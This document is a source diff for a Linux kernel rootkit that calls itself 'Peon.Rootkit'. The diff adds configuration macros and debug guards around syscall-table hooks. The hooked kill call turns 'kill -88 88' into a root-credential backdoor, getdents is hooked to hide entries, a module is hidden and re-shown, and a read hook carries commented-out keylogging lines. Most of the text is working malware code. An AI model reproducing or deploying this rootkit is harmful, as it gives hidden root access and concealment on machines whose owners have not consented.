@@ -18,19 +18,29 @@
 #include <asm/uaccess.h>
 #include <asm/unistd.h>
 
+
+#define HOOK_READ
+//#define NETWORK
+#define DEBUG
+#define SIG_4_ROOT 88
+#define PID_4_ROOT 88
+#define SIG_4_SHOW_MOD 22
+#define PID_4_SHOW_MOD 22
 #define ETH_P_ALL       0x0003
 
 #if defined(__LP64__) || defined(_LP64) //__x86_64 /* 64 bits machine */
 #define OS_64_BITS 1
 #define KERN_MEM_BEGIN 0xffffffff81000000
 #define KERN_MEM_END 0xffffffff81e42000
+
 #else	/* 32 bits machine */
 #define OS_64_BITS 0
-#define KERN_MEM_BEGIN 0xc0000000
-#define KERN_MEM_END 0xd0000000
+#define KERN_MEM_BEGIN 0xc0000000	//11000000 00000000 00000000 00000000
+#define KERN_MEM_END 0xd0000000		//11010000 00000000 00000000 00000000
 #endif 
 
 static struct kmem_cache *cred_jar;
+
 struct linux_dirent {
 	unsigned long   d_ino;
 	unsigned long   d_off;
@@ -123,20 +133,24 @@ struct packet_type pt;
 /* save module */
 struct module *mod;
 
-asmlinkage long (*orig_read_call) (int fd, void *buf, size_t count); 
-asmlinkage long hook_read_call(int fd, void *buf, size_t count){
+#ifdef HOOK_READ
+	asmlinkage long (*orig_read_call) (unsigned int fd, char __user *buf, size_t count); 
+	asmlinkage long hook_read_call(unsigned int fd,char __user *buf, size_t count){
+/*
+		long ret = orig_read_call( fd, buf, count);
+		if (fd==0){
+			//printk(KERN_ALERT "Peon.Rootkit: keyboard %s",(char*)buf);
+			//printk(KERN_ALERT "Peon.Rootkit: keyboard[0] = %c \n",((char*)buf)[0]);
+		}
+		return  ret;
+*/
+		return  orig_read_call( fd, buf, count);
+	} 
+#endif
 
-	long ret = orig_read_call( fd, buf, count);
-	if (fd==0){
-		//printk(KERN_ALERT "Peon.Rootkit: keyboard %s",(char*)buf);
-		//printk(KERN_ALERT "Peon.Rootkit: keyboard[0] = %c \n",((char*)buf)[0]);
-	}
-	return  ret;
-} 
 
 #if defined(__LP64__) || defined(_LP64) 
 /* -------------------------- 64 bits getdents version ------------------------------------------ */
-
 asmlinkage long (*orig_getdents) (unsigned int fd,  struct linux_dirent __user *dirent,  unsigned int count);
 asmlinkage long hacked_getdents(unsigned int fd,  struct linux_dirent __user *dirent, unsigned int count){
 
@@ -193,12 +207,12 @@ asmlinkage long hacked_getdents64 (unsigned int fd,  struct linux_dirent64 __use
 	return ret;
 }
 #endif
-asmlinkage long (*kill_orig_call) (pid_t pid, int sig);
 
+asmlinkage long (*kill_orig_call) (pid_t pid, int sig);
 asmlinkage long kill_hook_call( pid_t pid, int sig){
 
 	/* Hacked function : kill -88 88*/ 
-	if((sig ==88) &&(pid==88))
+	if((sig ==SIG_4_ROOT) &&(pid==PID_4_ROOT))
 	{
 		struct task_struct *cur_task;
 		const struct cred *old;
@@ -223,16 +237,20 @@ asmlinkage long kill_hook_call( pid_t pid, int sig){
 		credz->euid=0;
 		credz->egid=0; 
 		cur_task->cred=credz;
+		#ifdef DEBUG
 		printk(KERN_ALERT "Peon.Rootkit: [KILL -88 88]  shell root access");
+		#endif
 		kfree(old);
 	}
 
 	/*   show hided module  kill -22 22*/    
-	if((sig ==22) &&(pid==22) && FIRST_SHOW_MODULE){  
-		FIRST_SHOW_MODULE=0;
+	if((sig ==SIG_4_SHOW_MOD) &&(pid==PID_4_SHOW_MOD) && FIRST_SHOW_MODULE){  
+		FIRST_SHOW_MODULE=0; // only one try
 		/*  attach save module to the list of module by seaching snd module */    	
-		list_add(&mod->list,&find_module("snd")->list);    
+		list_add(&mod->list,&find_module("snd")->list);   
+		#ifdef DEBUG		
 		printk(KERN_ALERT "Peon.Rootkit: show module");
+		#endif
 	}
 	return kill_orig_call(pid,sig);
 }
@@ -243,7 +261,9 @@ asmlinkage long kill_hook_call( pid_t pid, int sig){
 int toto(struct sk_buff *skb, struct net_device *dev, struct packet_type *pkt,struct net_device *dev2)
 {
 	kfree_skb(skb);
+	#ifdef DEBUG
 	printk(KERN_ALERT "Peon.Rootkit: ping ping");
+	#endif
 	return 0;
 }
 
@@ -252,13 +272,16 @@ int init_module(void)
 
 	syscall_table = find_syscall_table();
 
-	if (syscall_table == 0)
-	{
+	if (syscall_table == 0){
+	#ifdef DEBUG
 		printk(KERN_INFO "Peon.Rootkit: System call table not found!\n");
+		#endif
 		return 1;
 	}
+	#ifdef DEBUG
 	printk(KERN_INFO "Peon.Rootkit: System call found at : 0x%lx\n", (unsigned long)syscall_table);
-
+	#endif
+	
 	/*  hide module  lsmod */    
 	//  mod=THIS_MODULE;
 	// list_del(&THIS_MODULE->list);
@@ -271,15 +294,19 @@ int init_module(void)
 
 	/*  Replace the syscall in the table */
 	syscall_table[__NR_kill] = (void*) kill_hook_call;
-
+#ifdef HOOK_READ
 	/*  Save the adress of the original read syscall */
 	orig_read_call= (void *) syscall_table[__NR_read];
 
 	/*  Replace the syscall in the table */
 	syscall_table[__NR_read] = (void*) hook_read_call;
+#endif
 
-#if defined(__LP64__) || defined(_LP64) 	
+#if defined(__LP64__) || defined(_LP64) 
+
+	#ifdef DEBUG	
 	printk(KERN_INFO "Peon.Rootkit is in 64 bits\n");
+	#endif
 	/*  Save the adress of the original getdents syscall */
 	orig_getdents= (void *) syscall_table[__NR_getdents];
 
@@ -288,8 +315,9 @@ int init_module(void)
 
 
 #else
+	#ifdef DEBUG
 	printk(KERN_INFO "Peon.Rootkit is in 32 bits\n");
-
+	#endif
 	/*  Save the adress of the original getdents64 syscall */
 	orig_getdents64= (void *) syscall_table[__NR_getdents64];
 
@@ -298,7 +326,7 @@ int init_module(void)
 
 #endif
 
-	/* 
+	#ifdef NETWORK
 	//remove interfacepacket layer2
 	__dev_remove_pack( &pt ); 
 	// stuff for network, call toto function  
@@ -306,12 +334,17 @@ int init_module(void)
 	// pt.dev = 0;
 	pt.func = toto;
 	dev_add_pack(&pt);
-	*/
+	#ifdef DEBUG
+	printk(KERN_INFO "Peon.Rootkit is loaded our Network device!\n");
+	#endif
+	#endif
 
 	enable_wp(); 
-
+	
+	#ifdef DEBUG
 	printk(KERN_INFO "Peon.Rootkit is loaded!\n");
-
+	#endif
+	
 	return 0;
 }
 
@@ -323,16 +356,21 @@ void cleanup_module(void)
 	/* Set the orignal call*/ 
 	syscall_table[__NR_kill ] = (void*) kill_orig_call;
 
+	#ifdef HOOK_READ
 	syscall_table[ __NR_read ] = (void*) orig_read_call;
+	#endif
 
-#if defined(__LP64__) || defined(_LP64)  
-	syscall_table[ __NR_getdents] = (void*) orig_getdents;
-#else
-	syscall_table[ __NR_getdents64] = (void*) orig_getdents64;
-#endif
+	#if defined(__LP64__) || defined(_LP64)  
+		syscall_table[ __NR_getdents] = (void*) orig_getdents;
+	#else
+		syscall_table[ __NR_getdents64] = (void*) orig_getdents64;
+	#endif
+	
 	enable_wp(); 
-
+	
+	#ifdef DEBUG
 	printk(KERN_INFO "Peon.Rootkit is unloaded!\n");
+	#endif
 }
 
 MODULE_LICENSE("GPL");
